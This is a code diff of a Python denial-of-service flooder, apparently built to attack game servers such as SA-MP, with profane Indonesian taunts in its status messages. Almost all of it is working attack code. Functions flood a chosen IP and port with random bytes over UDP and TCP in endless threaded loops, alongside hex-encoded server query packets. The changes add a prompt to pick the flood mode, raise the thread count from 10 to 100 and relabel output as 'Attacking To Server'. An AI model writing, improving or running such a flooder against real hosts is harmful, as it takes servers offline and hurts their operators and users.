@@ -43,6 +43,9 @@ time.sleep(.2)
 print(" \033[31m━━━ Port Nya Diisi Ya Syg")
 port = int(input(" ┗━>\033[0m:"))
 time.sleep(.1)
+print("\033[1;32;40m━━━ GASS KEN GA? (y/n)")
+choice = str(input("┗━>\033[0m:"))
+time.sleep(1)
 
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
@@ -63,8 +66,17 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("081e77da","hex_codec"),#cookie port 7777
                        codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                        codecs.decode("021efd40","hex_codec"),#cookie port 7784
-                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
-                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
+                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
+                       ] 
+Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
+                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
+                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
+                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
+                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
+                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
+                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
+                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
+                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                        ]
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
@@ -74,8 +86,7 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("081e77da","hex_codec"),#cookie port 7777
                        codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                        codecs.decode("021efd40","hex_codec"),#cookie port 7784
-                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
-                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
+                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                        ]
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
@@ -85,9 +96,8 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("081e77da","hex_codec"),#cookie port 7777
                        codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                        codecs.decode("021efd40","hex_codec"),#cookie port 7784
-                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
-                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
-                       ]
+                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
+                       ] 
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
                        codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
@@ -96,79 +106,39 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("081e77da","hex_codec"),#cookie port 7777
                        codecs.decode("081e4dda","hex_codec"),#cookie port 7771
                        codecs.decode("021efd40","hex_codec"),#cookie port 7784
-                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
-                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
-                       ]
-Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
-                       codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
-                       codecs.decode("53414d509538e1a9611e69","hex_codec"),#i
-                       codecs.decode("53414d509538e1a9611e72","hex_codec"),#r
-                       codecs.decode("081e62da","hex_codec"), #cookie port 7796
-                       codecs.decode("081e77da","hex_codec"),#cookie port 7777
-                       codecs.decode("081e4dda","hex_codec"),#cookie port 7771
-                       codecs.decode("021efd40","hex_codec"),#cookie port 7784
-                       codecs.decode("021efd40","hex_codec"),#cookie port 1111 
-                       codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
+                       codecs.decode("081e7eda","hex_codec")#cookie port 7784
                        ]
 
-
-def xxxxxx():
-  data = random._urandom(1000)
-  i = random.choice(("[*]","[!]","[#]"))
-  while True:
-    try:
-      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-      addr = (str(ip),int(port))
-      for x in range(times):
-        s.sendto(data,addr)
-        print(i +" PABLO BERSIAP MENEMBUS FUCKING SERVER")
-    except:
-      print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
-
-def xxxxx():
-  data = random._urandom(1000)
-  i = random.choice(("[*]","[!]","[#]"))
-  while True:
-    try:
-      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-      addr = (str(ip),int(port))
-      for x in range(times):
-        s.sendto(data,addr)
-        print(i +" PABLO BERSIAP MENEMBUS FUCKING SERVER")
-    except:
-      print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
 def xxxx():
-  data = random._urandom(1000)
-  i = random.choice(("[*]","[!]","[#]"))
+  data = random._urandom(998)
+  i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
       s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       addr = (str(ip),int(port))
       for x in range(times):
         s.sendto(data,addr)
-        print(i +" PABLO BERSIAP MENEMBUS FUCKING SERVER")
+        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
     except:
       print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
 def xxx():
-  data = random._urandom(1000)
-  i = random.choice(("[*]","[!]","[#]"))
+  data = random._urandom(998)
+  i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
-      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      s.connect((ip,port))
-      s.send(data)
+      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+      addr = (str(ip),int(port))
       for x in range(times):
-        s.send(data)
-        print(i +" PABLO BERSIAP MENEMBUS FUCKING SERVER")
+        s.sendto(data,addr)
+        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
     except:
-      s.close()
-      print("[!] MATI LU SERVER NGENTOD")
+      print("[!] PABLO BERSIAP MENEMBUS FUCKING SERVER")
 
 def xx():
-  data = random._urandom(1000)
-  i = random.choice(("[*]","[!]","[#]"))
+  data = random._urandom(871)
+  i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -176,14 +146,14 @@ def xx():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" PABLO BERSIAP MENEMBUS FUCKING SERVER")
+        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
-      print("[!] SERVER LEMAH JANCOKK")
+      print("[!] DOWN LU KONTOLLL!!!!")
 
 def x():
-  data = random._urandom(1000)
-  i = random.choice(("[*]","[!]","[#]"))
+  data = random._urandom(871)
+  i = random.choice(("[•]","[•]","[•]"))
   while True:
     try:
       s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -191,20 +161,18 @@ def x():
       s.send(data)
       for x in range(times):
         s.send(data)
-        print(i +" PABLO BERSIAP MENEMBUS FUCKING SERVER")
+        print(i +" \033[32m=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
     except:
       s.close()
-      print("[!] SERVER MU LEMAH SEKALI")
+      print("[!] SERVER LEMAH NGENTOD!!!!!!")
 
 for y in range(port):
-    th = threading.Thread(target = xxxxxx)
-    th.start()
-    th = threading.Thread(target = xxxxx)
-    th.start()
+  if choice == 'y':
     th = threading.Thread(target = xxxx)
     th.start()
     th = threading.Thread(target = xxx)
     th.start()
+  else:
     th = threading.Thread(target = xx)
     th.start()
     th = threading.Thread(target = x)
@@ -239,10 +207,10 @@ class MyThread(threading.Thread):
 
 if __name__ == '__main__':
     try:
-     for x in range(10):                  
+     for x in range(100):                                    
             mythread = MyThread()  
             mythread.start()                                  
-            time.sleep(.1)    
+            time.sleep(1)    
     except(KeyboardInterrupt):
          os.system('cls' if os.name == 'nt' else 'clear')
          
